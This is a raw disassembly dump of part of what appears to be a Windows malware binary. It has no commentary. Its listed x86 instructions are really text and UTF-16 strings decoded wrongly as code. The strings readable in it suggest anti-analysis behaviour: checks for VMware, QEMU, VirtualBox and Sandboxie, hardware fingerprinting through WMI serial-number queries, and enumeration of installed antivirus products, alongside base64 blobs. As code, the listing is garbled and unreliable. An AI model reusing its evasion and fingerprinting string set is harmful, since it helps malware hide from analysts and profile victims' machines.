  407a97:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407a98:	e7 9a                	out    %eax,$0x9a
  407a9a:	84 e7                	test   %ah,%bh
  407a9c:	9a 84 e6 95 ac e9 a1 	lcall  $0xa1e9,$0xac95e684
  407aa3:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407aa4:	00 e7                	add    %ah,%bh
  407aa6:	9a 84 e5 b0 87 e5 8f 	lcall  $0x8fe5,$0x87b0e584
  407aad:	b8 e6 be a4 e5       	mov    $0xe5a4bee6,%eax
  407ab2:	b8 ad e9 a6 96       	mov    $0x96a6e9ad,%eax
  407ab7:	e6 89                	out    %al,$0x89
  407ab9:	bf e7 9a 84 e9       	mov    $0xe9849ae7,%edi
  407abe:	a1 a7 e5 b8 ad       	mov    0xadb8e5a7,%eax
  407ac3:	e7 82                	out    %eax,$0x82
  407ac5:	ba e9 a1 a7 00       	mov    $0xa7a1e9,%edx
  407aca:	e5 8f                	in     $0x8f,%eax
  407acc:	b8 e5 ae b6 e5       	mov    $0xe5b6aee5,%eax
  407ad1:	bc 95 e5 9f 8e       	mov    $0x8e9fe595,%esp
  407ad6:	e7 9a                	out    %eax,$0x9a
  407ad8:	84 e5                	test   %ah,%ch
  407ada:	b0 87                	mov    $0x87,%al
  407adc:	e5 8f                	in     $0x8f,%eax
  407ade:	b8 e6 95 ac e6       	mov    $0xe6ac95e6,%eax
  407ae3:	98                   	cwtl
  407ae4:	af                   	scas   %es:(%edi),%eax
  407ae5:	e6 89                	out    %al,$0x89
  407ae7:	bf e6 88 90 e5       	mov    $0xe59088e6,%edi
  407aec:	b8 ad e7 9a 84       	mov    $0x849ae7ad,%eax
  407af1:	e9 a1 a7 00 e9       	jmp    0xe9412297
  407af6:	a1 a7 e7 8e 89       	mov    0x898ee7a7,%eax
  407afb:	e7 9a                	out    %eax,$0x9a
  407afd:	84 e5                	test   %ah,%ch
  407aff:	9f                   	lahf
  407b00:	8e e5                	mov    %ebp,%fs
  407b02:	bc 95 e6 8e a5       	mov    $0xa58ee695,%esp
  407b07:	e7 94                	out    %eax,$0x94
  407b09:	9f                   	lahf
  407b0a:	e5 b0                	in     $0xb0,%eax
  407b0c:	87 e5                	xchg   %esp,%ebp
  407b0e:	9f                   	lahf
  407b0f:	8e e4                	mov    %esp,%fs
  407b11:	bd bf e7 9a 84       	mov    $0x849ae7bf,%ebp
  407b16:	e7 ae                	out    %eax,$0xae
  407b18:	a1 e9 a1 a7 00       	mov    0xa7a1e9,%eax
  407b1d:	e6 be                	out    %al,$0xbe
  407b1f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407b20:	e6 95                	out    %al,$0x95
  407b22:	ac                   	lods   %ds:(%esi),%al
  407b23:	e5 a5                	in     $0xa5,%eax
  407b25:	b9 e6 b3 95 e7       	mov    $0xe795b3e6,%ecx
  407b2a:	94                   	xchg   %eax,%esp
  407b2b:	9f                   	lahf
  407b2c:	e5 a5                	in     $0xa5,%eax
  407b2e:	b9 e9 a1 a7 e6       	mov    $0xe6a7a1e9,%ecx
  407b33:	8e a5 e5 a4 aa e7    	mov    -0x18555b1b(%ebp),%fs
  407b39:	b9 bc e9 a1 a7       	mov    $0xa7a1e9bc,%ecx
  407b3e:	00 e6                	add    %ah,%dh
  407b40:	88 90 e7 94 9f e9    	mov    %dl,-0x16606b19(%eax)
  407b46:	a1 a7 e7 82 ba       	mov    0xba82e7a7,%eax
  407b4b:	e7 9a                	out    %eax,$0x9a
  407b4d:	84 e8                	test   %ch,%al
  407b4f:	a1 8c e6 98 af       	mov    0xaf98e68c,%eax
  407b54:	e5 8f                	in     $0x8f,%eax
  407b56:	b8 e5 b8 ad e7       	mov    $0xe7adb8e5,%eax
  407b5b:	ae                   	scas   %es:(%edi),%al
  407b5c:	a1 e5 b0 8e e9       	mov    0xe98eb0e5,%eax
  407b61:	a1 a7 e9 a1 a7       	mov    0xa7a1e9a7,%eax
  407b66:	00 e5                	add    %ah,%ch
  407b68:	9f                   	lahf
  407b69:	8e e5                	mov    %ebp,%fs
  407b6b:	8f                   	(bad)
  407b6c:	b8 e6 b3 95 e7       	mov    $0xe795b3e6,%eax
  407b71:	9a 84 e5 91 bd e9 a6 	lcall  $0xa6e9,$0xbd91e584
  407b78:	96                   	xchg   %eax,%esi
  407b79:	00 e4                	add    %ah,%ah
  407b7b:	ba ba e7 94 9f       	mov    $0x9f94e7ba,%edx
  407b80:	e5 ae                	in     $0xae,%eax
  407b82:	98                   	cwtl
  407b83:	e9 a6 96 e6 be       	jmp    0xbf27122e
  407b88:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407b89:	e7 9a                	out    %eax,$0x9a
  407b8b:	84 e5                	test   %ah,%ch
  407b8d:	85 ac e5 bc 95 e9 a6 	test   %ebp,-0x59166a44(%ebp,%eiz,8)
  407b94:	96                   	xchg   %eax,%esi
  407b95:	00 e6                	add    %ah,%dh
  407b97:	be a4 e5 8f 97       	mov    $0x978fe5a4,%esi
  407b9c:	e5 ae                	in     $0xae,%eax
  407b9e:	b6 e5                	mov    $0xe5,%dh
  407ba0:	95                   	xchg   %eax,%ebp
  407ba1:	86 e4                	xchg   %ah,%ah
  407ba3:	bd bf e4 ba ba       	mov    $0xbabae4bf,%ebp
  407ba8:	e5 9f                	in     $0x9f,%eax
  407baa:	8e e6                	mov    %esi,%fs
  407bac:	88 90 e5 ad 90 e7    	mov    %dl,-0x186f521b(%eax)
  407bb2:	a8 8b                	test   $0x8b,%al
  407bb4:	e6 8e                	out    %al,$0x8e
  407bb6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407bb7:	e9 a6 96 00 e7       	jmp    0xe7411262
  407bbc:	8e 89 e5 a4 aa e7    	mov    -0x18555b1b(%ecx),%cs
  407bc2:	9a 84 e5 ae b6 e7 9a 	lcall  $0x9ae7,$0xb6aee584
  407bc9:	84 e5                	test   %ah,%ch
  407bcb:	b0 8e                	mov    $0x8e,%al
  407bcd:	e7 a8                	out    %eax,$0xa8
  407bcf:	8b e7                	mov    %edi,%esp
  407bd1:	9a 84 e9 a6 96 00 e5 	lcall  $0xe500,$0x96a6e984
  407bd8:	ad                   	lods   %ds:(%esi),%eax
  407bd9:	ab                   	stos   %eax,%es:(%edi)
  407bda:	e6 9c                	out    %al,$0x9c
  407bdc:	9b                   	fwait
  407bdd:	e9 a1 a7 e5 a5       	jmp    0xa6262383
  407be2:	b9 e5 8f 97 e5       	mov    $0xe5978fe5,%ecx
  407be7:	85 ac e7 82 ba e7 9a 	test   %ebp,-0x6518457e(%edi,%eiz,8)
  407bee:	84 e9                	test   %ch,%cl
  407bf0:	87 91 e5 95 86 e7    	xchg   %edx,-0x18796a1b(%ecx)
  407bf6:	82 ba e6 89 bf e7 ae 	cmpb   $0xae,-0x1840761a(%edx)
  407bfd:	a1 e9 a6 96 00       	mov    0x96a6e9,%eax
  407c02:	00 00                	add    %al,(%eax)
  407c04:	00 79 55             	add    %bh,0x55(%ecx)
  407c07:	00 33                	add    %dh,(%ebx)
  407c09:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  407c0d:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
  407c11:	00 56 00             	add    %dl,0x0(%esi)
  407c14:	74 00                	je     0x407c16
  407c16:	58                   	pop    %eax
  407c17:	00 45 00             	add    %al,0x0(%ebp)
  407c1a:	4e                   	dec    %esi
  407c1b:	00 31                	add    %dh,(%ecx)
  407c1d:	00 63 00             	add    %ah,0x0(%ebx)
  407c20:	6e                   	outsb  %ds:(%esi),(%dx)
  407c21:	00 4a 00             	add    %cl,0x0(%edx)
  407c24:	6c                   	insb   (%dx),%es:(%edi)
  407c25:	00 62 00             	add    %ah,0x0(%edx)
  407c28:	6e                   	outsb  %ds:(%esi),(%dx)
  407c29:	00 52 00             	add    %dl,0x0(%edx)
  407c2c:	44                   	inc    %esp
  407c2d:	00 62 00             	add    %ah,0x0(%edx)
  407c30:	32 00                	xor    (%eax),%al
  407c32:	35 00 30 00 63       	xor    $0x63003000,%eax
  407c37:	00 6d 00             	add    %ch,0x0(%ebp)
  407c3a:	39 00                	cmp    %eax,(%eax)
  407c3c:	73 00                	jae    0x407c3e
  407c3e:	55                   	push   %ebp
  407c3f:	00 32                	add    %dh,(%edx)
  407c41:	00 56 00             	add    %dl,0x0(%esi)
  407c44:	30 00                	xor    %al,(%eax)
  407c46:	58                   	pop    %eax
  407c47:	00 46 00             	add    %al,0x0(%esi)
  407c4a:	4e                   	dec    %esi
  407c4b:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  407c4f:	00 6e 00             	add    %ch,0x0(%esi)
  407c52:	5a                   	pop    %edx
  407c53:	00 70 00             	add    %dh,0x0(%eax)
  407c56:	59                   	pop    %ecx
  407c57:	00 32                	add    %dh,(%edx)
  407c59:	00 56 00             	add    %dl,0x0(%esi)
  407c5c:	7a 00                	jp     0x407c5e
  407c5e:	58                   	pop    %eax
  407c5f:	00 45 00             	add    %al,0x0(%ebp)
  407c62:	52                   	push   %edx
  407c63:	00 70 00             	add    %dh,0x0(%eax)
  407c66:	63 00                	arpl   %eax,(%eax)
  407c68:	32 00                	xor    (%eax),%al
  407c6a:	74 00                	je     0x407c6c
  407c6c:	63 00                	arpl   %eax,(%eax)
  407c6e:	52                   	push   %edx
  407c6f:	00 57 00             	add    %dl,0x0(%edi)
  407c72:	35 00 31 00 62       	xor    $0x62003100,%eax
  407c77:	00 56 00             	add    %dl,0x0(%esi)
  407c7a:	77 00                	ja     0x407c7c
  407c7c:	3d 00 00 03 30       	cmp    $0x30030000,%eax
  407c81:	00 00                	add    %al,(%eax)
  407c83:	01 00                	add    %eax,(%eax)
  407c85:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  407c8a:	77 00                	ja     0x407c8c
  407c8c:	61                   	popa
  407c8d:	00 72 00             	add    %dh,0x0(%edx)
  407c90:	65 00 00             	add    %al,%gs:(%eax)
  407c93:	09 71 00             	or     %esi,0x0(%ecx)
  407c96:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  407c9a:	75 00                	jne    0x407c9c
  407c9c:	00 05 58 00 50 00    	add    %al,0x500058
  407ca2:	00 17                	add    %dl,(%edi)
  407ca4:	53                   	push   %ebx
  407ca5:	00 62 00             	add    %ah,0x0(%edx)
  407ca8:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  407cae:	6c                   	insb   (%dx),%es:(%edi)
  407caf:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  407cb3:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  407cb7:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  407cbb:	0d 77 00 69 00       	or     $0x690077,%eax
  407cc0:	6e                   	outsb  %ds:(%esi),(%dx)
  407cc1:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  407cc5:	00 72 00             	add    %dh,0x0(%edx)
  407cc8:	00 1b                	add    %bl,(%ebx)
  407cca:	5c                   	pop    %esp
  407ccb:	00 76 00             	add    %dh,0x0(%esi)
  407cce:	62 00                	bound  %eax,(%eax)
  407cd0:	6f                   	outsl  %ds:(%esi),(%dx)
  407cd1:	00 78 00             	add    %bh,0x0(%eax)
  407cd4:	68 00 6f 00 6f       	push   $0x6f006f00
  407cd9:	00 6b 00             	add    %ch,0x0(%ebx)
  407cdc:	2e 00 64 00 6c       	add    %ah,%cs:0x6c(%eax,%eax,1)
  407ce1:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  407ce5:	51                   	push   %ecx
  407ce6:	59                   	pop    %ecx
  407ce7:	00 32                	add    %dh,(%edx)
  407ce9:	00 31                	add    %dh,(%ecx)
  407ceb:	00 6b 00             	add    %ch,0x0(%ebx)
  407cee:	4c                   	dec    %esp
  407cef:	00 6d 00             	add    %ch,0x0(%ebp)
  407cf2:	56                   	push   %esi
  407cf3:	00 34 00             	add    %dh,(%eax,%eax,1)
  407cf6:	5a                   	pop    %edx
  407cf7:	00 53 00             	add    %dl,0x0(%ebx)
  407cfa:	41                   	inc    %ecx
  407cfb:	00 76 00             	add    %dh,0x0(%esi)
  407cfe:	59                   	pop    %ecx
  407cff:	00 79 00             	add    %bh,0x0(%ecx)
  407d02:	42                   	inc    %edx
  407d03:	00 77 00             	add    %dh,0x0(%edi)
  407d06:	61                   	popa
  407d07:	00 57 00             	add    %dl,0x0(%edi)
  407d0a:	35 00 6e 00 49       	xor    $0x49006e00,%eax
  407d0f:	00 44 00 41          	add    %al,0x41(%eax,%eax,1)
  407d13:	00 67 00             	add    %ah,0x0(%edi)
  407d16:	4c                   	dec    %esp
  407d17:	00 57 00             	add    %dl,0x0(%edi)
  407d1a:	34 00                	xor    $0x0,%al
  407d1c:	67 00 4d 00          	add    %cl,0x0(%di)
  407d20:	69 00 41 00 6d 00    	imul   $0x6d0041,(%eax),%eax
  407d26:	49                   	dec    %ecx
  407d27:	00 47 00             	add    %al,0x0(%edi)
  407d2a:	52                   	push   %edx
  407d2b:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  407d2f:	00 43 00             	add    %al,0x0(%ebx)
  407d32:	41                   	inc    %ecx
  407d33:	00 3d 00 00 03 22    	add    %bh,0x22030000
  407d39:	00 00                	add    %al,(%eax)
  407d3b:	13 53 00             	adc    0x0(%ebx),%edx
  407d3e:	6f                   	outsl  %ds:(%esi),(%dx)
  407d3f:	00 66 00             	add    %ah,0x0(%esi)
  407d42:	74 00                	je     0x407d44
  407d44:	77 00                	ja     0x407d46
  407d46:	61                   	popa
  407d47:	00 72 00             	add    %dh,0x0(%edx)
  407d4a:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  407d4f:	21 3a                	and    %edi,(%edx)
  407d51:	00 5a 00             	add    %bl,0x0(%edx)
  407d54:	6f                   	outsl  %ds:(%esi),(%dx)
  407d55:	00 6e 00             	add    %ch,0x0(%esi)
  407d58:	65 00 2e             	add    %ch,%gs:(%esi)
  407d5b:	00 49 00             	add    %cl,0x0(%ecx)
  407d5e:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  407d62:	6e                   	outsb  %ds:(%esi),(%dx)
  407d63:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  407d67:	00 66 00             	add    %ah,0x0(%esi)
  407d6a:	69 00 65 00 72 00    	imul   $0x720065,(%eax),%eax
  407d70:	00 03                	add    %al,(%ebx)
  407d72:	5f                   	pop    %edi
  407d73:	00 00                	add    %al,(%eax)
  407d75:	0b 45 00             	or     0x0(%ebp),%eax
  407d78:	72 00                	jb     0x407d7a
  407d7a:	72 00                	jb     0x407d7c
  407d7c:	6f                   	outsl  %ds:(%esi),(%dx)
  407d7d:	00 72 00             	add    %dh,0x0(%edx)
  407d80:	00 13                	add    %dl,(%ebx)
  407d82:	4d                   	dec    %ebp
  407d83:	00 69 00             	add    %ch,0x0(%ecx)
  407d86:	63 00                	arpl   %eax,(%eax)
  407d88:	72 00                	jb     0x407d8a
  407d8a:	6f                   	outsl  %ds:(%esi),(%dx)
  407d8b:	00 73 00             	add    %dh,0x0(%ebx)
  407d8e:	6f                   	outsl  %ds:(%esi),(%dx)
  407d8f:	00 66 00             	add    %ah,0x0(%esi)
  407d92:	74 00                	je     0x407d94
  407d94:	00 0f                	add    %cl,(%edi)
  407d96:	57                   	push   %edi
  407d97:	00 69 00             	add    %ch,0x0(%ecx)
  407d9a:	6e                   	outsb  %ds:(%esi),(%dx)
  407d9b:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  407d9f:	00 77 00             	add    %dh,0x0(%edi)
  407da2:	73 00                	jae    0x407da4
  407da4:	00 07                	add    %al,(%edi)
  407da6:	57                   	push   %edi
  407da7:	00 69 00             	add    %ch,0x0(%ecx)
  407daa:	6e                   	outsb  %ds:(%esi),(%dx)
  407dab:	00 00                	add    %al,(%eax)
  407dad:	03 ae 00 01 03 22    	add    0x22030100(%esi),%ebp
  407db3:	21 01                	and    %eax,(%ecx)
  407db5:	05 20 00 20 00       	add    $0x200020,%eax
  407dba:	00 03                	add    %al,(%ebx)
  407dbc:	20 00                	and    %al,(%eax)
  407dbe:	00 09                	add    %cl,(%ecx)
  407dc0:	20 00                	and    %al,(%eax)
  407dc2:	57                   	push   %edi
  407dc3:	00 69 00             	add    %ch,0x0(%ecx)
  407dc6:	6e                   	outsb  %ds:(%esi),(%dx)
  407dc7:	00 00                	add    %al,(%eax)
  407dc9:	0d 55 00 6e 00       	or     $0x6e0055,%eax
  407dce:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  407dd1:	00 77 00             	add    %dh,0x0(%edi)
  407dd4:	6e                   	outsb  %ds:(%esi),(%dx)
  407dd5:	00 00                	add    %al,(%eax)
  407dd7:	2d 50 00 52 00       	sub    $0x520050,%eax
  407ddc:	4f                   	dec    %edi
  407ddd:	00 43 00             	add    %al,0x0(%ebx)
  407de0:	45                   	inc    %ebp
  407de1:	00 53 00             	add    %dl,0x0(%ebx)
  407de4:	53                   	push   %ebx
  407de5:	00 4f 00             	add    %cl,0x0(%edi)
  407de8:	52                   	push   %edx
  407de9:	00 5f 00             	add    %bl,0x0(%edi)
  407dec:	41                   	inc    %ecx
  407ded:	00 52 00             	add    %dl,0x0(%edx)
  407df0:	43                   	inc    %ebx
  407df1:	00 48 00             	add    %cl,0x0(%eax)
  407df4:	49                   	dec    %ecx
  407df5:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  407df9:	00 43 00             	add    %al,0x0(%ebx)
  407dfc:	54                   	push   %esp
  407dfd:	00 55 00             	add    %dl,0x0(%ebp)
  407e00:	52                   	push   %edx
  407e01:	00 45 00             	add    %al,0x0(%ebp)
  407e04:	00 05 36 00 34 00    	add    %al,0x340036
  407e0a:	00 07                	add    %al,(%edi)
  407e0c:	78 00                	js     0x407e0e
  407e0e:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  407e12:	00 07                	add    %al,(%edi)
  407e14:	78 00                	js     0x407e16
  407e16:	38 00                	cmp    %al,(%eax)
  407e18:	36 00 00             	add    %al,%ss:(%eax)
  407e1b:	03 2a                	add    (%edx),%ebp
  407e1d:	00 00                	add    %al,(%eax)
  407e1f:	13 64 00 64          	adc    0x64(%eax,%eax,1),%esp
  407e23:	00 2f                	add    %ch,(%edi)
  407e25:	00 4d 00             	add    %cl,0x0(%ebp)
  407e28:	4d                   	dec    %ebp
  407e29:	00 2f                	add    %ch,(%edi)
  407e2b:	00 79 00             	add    %bh,0x0(%ecx)
  407e2e:	79 00                	jns    0x407e30
  407e30:	79 00                	jns    0x407e32
  407e32:	00 1f                	add    %bl,(%edi)
  407e34:	57                   	push   %edi
  407e35:	00 69 00             	add    %ch,0x0(%ecx)
  407e38:	6e                   	outsb  %ds:(%esi),(%dx)
  407e39:	00 33                	add    %dh,(%ebx)
  407e3b:	00 32                	add    %dh,(%edx)
  407e3d:	00 5f 00             	add    %bl,0x0(%edi)
  407e40:	50                   	push   %eax
  407e41:	00 72 00             	add    %dh,0x0(%edx)
  407e44:	6f                   	outsl  %ds:(%esi),(%dx)
  407e45:	00 63 00             	add    %ah,0x0(%ebx)
  407e48:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407e4c:	73 00                	jae    0x407e4e
  407e4e:	6f                   	outsl  %ds:(%esi),(%dx)
  407e4f:	00 72 00             	add    %dh,0x0(%edx)
  407e52:	00 17                	add    %dl,(%edi)
  407e54:	50                   	push   %eax
  407e55:	00 72 00             	add    %dh,0x0(%edx)
  407e58:	6f                   	outsl  %ds:(%esi),(%dx)
  407e59:	00 63 00             	add    %ah,0x0(%ebx)
  407e5c:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407e60:	73 00                	jae    0x407e62
  407e62:	6f                   	outsl  %ds:(%esi),(%dx)
  407e63:	00 72 00             	add    %dh,0x0(%edx)
  407e66:	49                   	dec    %ecx
  407e67:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  407e6b:	03 2d 00 00 15 57    	add    0x57150000,%ebp
  407e71:	00 69 00             	add    %ch,0x0(%ecx)
  407e74:	6e                   	outsb  %ds:(%esi),(%dx)
  407e75:	00 33                	add    %dh,(%ebx)
  407e77:	00 32                	add    %dh,(%edx)
  407e79:	00 5f 00             	add    %bl,0x0(%edi)
  407e7c:	42                   	inc    %edx
  407e7d:	00 49 00             	add    %cl,0x0(%ecx)
  407e80:	4f                   	dec    %edi
  407e81:	00 53 00             	add    %dl,0x0(%ebx)
  407e84:	00 19                	add    %bl,(%ecx)
  407e86:	53                   	push   %ebx
  407e87:	00 65 00             	add    %ah,0x0(%ebp)
  407e8a:	72 00                	jb     0x407e8c
  407e8c:	69 00 61 00 6c 00    	imul   $0x6c0061,(%eax),%eax
  407e92:	4e                   	dec    %esi
  407e93:	00 75 00             	add    %dh,0x0(%ebp)
  407e96:	6d                   	insl   (%dx),%es:(%edi)
  407e97:	00 62 00             	add    %ah,0x0(%edx)
  407e9a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407e9e:	00 1f                	add    %bl,(%edi)
  407ea0:	57                   	push   %edi
  407ea1:	00 69 00             	add    %ch,0x0(%ecx)
  407ea4:	6e                   	outsb  %ds:(%esi),(%dx)
  407ea5:	00 33                	add    %dh,(%ebx)
  407ea7:	00 32                	add    %dh,(%edx)
  407ea9:	00 5f 00             	add    %bl,0x0(%edi)
  407eac:	42                   	inc    %edx
  407ead:	00 61 00             	add    %ah,0x0(%ecx)
  407eb0:	73 00                	jae    0x407eb2
  407eb2:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  407eb6:	6f                   	outsl  %ds:(%esi),(%dx)
  407eb7:	00 61 00             	add    %ah,0x0(%ecx)
  407eba:	72 00                	jb     0x407ebc
  407ebc:	64 00 00             	add    %al,%fs:(%eax)
  407ebf:	2b 57 00             	sub    0x0(%edi),%edx
  407ec2:	69 00 6e 00 33 00    	imul   $0x33006e,(%eax),%eax
  407ec8:	32 00                	xor    (%eax),%al
  407eca:	5f                   	pop    %edi
  407ecb:	00 56 00             	add    %dl,0x0(%esi)
  407ece:	69 00 64 00 65 00    	imul   $0x650064,(%eax),%eax
  407ed4:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed5:	00 43 00             	add    %al,0x0(%ebx)
  407ed8:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed9:	00 6e 00             	add    %ch,0x0(%esi)
  407edc:	74 00                	je     0x407ede
  407ede:	72 00                	jb     0x407ee0
  407ee0:	6f                   	outsl  %ds:(%esi),(%dx)
  407ee1:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  407ee5:	00 65 00             	add    %ah,0x0(%ebp)
  407ee8:	72 00                	jb     0x407eea
  407eea:	00 09                	add    %cl,(%ecx)
  407eec:	4e                   	dec    %esi
  407eed:	00 61 00             	add    %ah,0x0(%ecx)
  407ef0:	6d                   	insl   (%dx),%es:(%edi)
  407ef1:	00 65 00             	add    %ah,0x0(%ebp)
  407ef4:	00 05 78 00 32 00    	add    %al,0x320078
  407efa:	00 17                	add    %dl,(%edi)
  407efc:	52                   	push   %edx
  407efd:	00 61 00             	add    %ah,0x0(%ecx)
  407f00:	6e                   	outsb  %ds:(%esi),(%dx)
  407f01:	00 73 00             	add    %dh,0x0(%ebx)
  407f04:	2d 00 53 00 74       	sub    $0x74005300,%eax
  407f09:	00 61 00             	add    %ah,0x0(%ecx)
  407f0c:	74 00                	je     0x407f0e
  407f0e:	75 00                	jne    0x407f10
  407f10:	73 00                	jae    0x407f12
  407f12:	00 1b                	add    %bl,(%ebx)
  407f14:	4e                   	dec    %esi
  407f15:	00 6f 00             	add    %ch,0x0(%edi)
  407f18:	74 00                	je     0x407f1a
  407f1a:	20 00                	and    %al,(%eax)
  407f1c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  407f20:	63 00                	arpl   %eax,(%eax)
  407f22:	72 00                	jb     0x407f24
  407f24:	79 00                	jns    0x407f26
  407f26:	70 00                	jo     0x407f28
  407f28:	74 00                	je     0x407f2a
  407f2a:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  407f2f:	07                   	pop    %es
  407f30:	55                   	push   %ebp
  407f31:	00 53 00             	add    %dl,0x0(%ebx)
  407f34:	42                   	inc    %edx
  407f35:	00 00                	add    %al,(%eax)
  407f37:	13 4e 00             	adc    0x0(%esi),%ecx
  407f3a:	6f                   	outsl  %ds:(%esi),(%dx)
  407f3b:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  407f3f:	00 72 00             	add    %dh,0x0(%edx)
  407f42:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407f46:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  407f4a:	00 11                	add    %dl,(%ecx)
  407f4c:	44                   	inc    %esp
  407f4d:	00 69 00             	add    %ch,0x0(%ecx)
  407f50:	73 00                	jae    0x407f52
  407f52:	61                   	popa
  407f53:	00 62 00             	add    %ah,0x0(%edx)
  407f56:	6c                   	insb   (%dx),%es:(%edi)
  407f57:	00 65 00             	add    %ah,0x0(%ebp)
  407f5a:	64 00 00             	add    %al,%fs:(%eax)
  407f5d:	05 5c 00 5c 00       	add    $0x5c005c,%eax
  407f62:	00 2b                	add    %ch,(%ebx)
  407f64:	5c                   	pop    %esp
  407f65:	00 72 00             	add    %dh,0x0(%edx)
  407f68:	6f                   	outsl  %ds:(%esi),(%dx)
  407f69:	00 6f 00             	add    %ch,0x0(%edi)
  407f6c:	74 00                	je     0x407f6e
  407f6e:	5c                   	pop    %esp
  407f6f:	00 53 00             	add    %dl,0x0(%ebx)
  407f72:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407f76:	75 00                	jne    0x407f78
  407f78:	72 00                	jb     0x407f7a
  407f7a:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  407f80:	43                   	inc    %ebx
  407f81:	00 65 00             	add    %ah,0x0(%ebp)
  407f84:	6e                   	outsb  %ds:(%esi),(%dx)
  407f85:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  407f89:	00 72 00             	add    %dh,0x0(%edx)
  407f8c:	32 00                	xor    (%eax),%al
  407f8e:	00 3d 53 00 45 00    	add    %bh,0x450053
  407f94:	4c                   	dec    %esp
  407f95:	00 45 00             	add    %al,0x0(%ebp)
  407f98:	43                   	inc    %ebx
  407f99:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  407f9d:	00 2a                	add    %ch,(%edx)
  407f9f:	00 20                	add    %ah,(%eax)
  407fa1:	00 46 00             	add    %al,0x0(%esi)
  407fa4:	52                   	push   %edx
  407fa5:	00 4f 00             	add    %cl,0x0(%edi)
  407fa8:	4d                   	dec    %ebp
  407fa9:	00 20                	add    %ah,(%eax)
  407fab:	00 41 00             	add    %al,0x0(%ecx)
  407fae:	6e                   	outsb  %ds:(%esi),(%dx)
  407faf:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  407fb3:	00 76 00             	add    %dh,0x0(%esi)
  407fb6:	69 00 72 00 75 00    	imul   $0x750072,(%eax),%eax
  407fbc:	73 00                	jae    0x407fbe
  407fbe:	50                   	push   %eax
  407fbf:	00 72 00             	add    %dh,0x0(%edx)
  407fc2:	6f                   	outsl  %ds:(%esi),(%dx)
  407fc3:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  407fc7:	00 63 00             	add    %ah,0x0(%ebx)
  407fca:	74 00                	je     0x407fcc
  407fcc:	00 17                	add    %dl,(%edi)
  407fce:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  407fd2:	73 00                	jae    0x407fd4
  407fd4:	70 00                	jo     0x407fd6
  407fd6:	6c                   	insb   (%dx),%es:(%edi)
  407fd7:	00 61 00             	add    %ah,0x0(%ecx)
  407fda:	79 00                	jns    0x407fdc
  407fdc:	4e                   	dec    %esi
  407fdd:	00 61 00             	add    %ah,0x0(%ecx)
  407fe0:	6d                   	insl   (%dx),%es:(%edi)
  407fe1:	00 65 00             	add    %ah,0x0(%ebp)
  407fe4:	00 07                	add    %al,(%edi)
  407fe6:	4e                   	dec    %esi
  407fe7:	00 2f                	add    %ch,(%edi)
  407fe9:	00 41 00             	add    %al,0x0(%ecx)
  407fec:	00 0d 52 00 65 00    	add    %cl,0x650052
  407ff2:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  407ff6:	73 00                	jae    0x407ff8
  407ff8:	6d                   	insl   (%dx),%es:(%edi)
  407ff9:	00 00                	add    %al,(%eax)
  407ffb:	6d                   	insl   (%dx),%es:(%edi)
  407ffc:	73 00                	jae    0x407ffe
  407ffe:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  408003:	00 63 00             	add    %ah,0x0(%ebx)
  408006:	74 00                	je     0x408008
  408008:	20 00                	and    %al,(%eax)
  40800a:	43                   	inc    %ebx
  40800b:	00 6f 00             	add    %ch,0x0(%edi)
  40800e:	6d                   	insl   (%dx),%es:(%edi)
  40800f:	00 6d 00             	add    %ch,0x0(%ebp)
  408012:	61                   	popa
  408013:	00 6e 00             	add    %ch,0x0(%esi)
  408016:	64 00 4c 00 69       	add    %cl,%fs:0x69(%eax,%eax,1)
  40801b:	00 6e 00             	add    %ch,0x0(%esi)
  40801e:	65 00 20             	add    %ah,%gs:(%eax)
  408021:	00 66 00             	add    %ah,0x0(%esi)
  408024:	72 00                	jb     0x408026
  408026:	6f                   	outsl  %ds:(%esi),(%dx)
  408027:	00 6d 00             	add    %ch,0x0(%ebp)
  40802a:	20 00                	and    %al,(%eax)
  40802c:	57                   	push   %edi
  40802d:	00 69 00             	add    %ch,0x0(%ecx)
  408030:	6e                   	outsb  %ds:(%esi),(%dx)
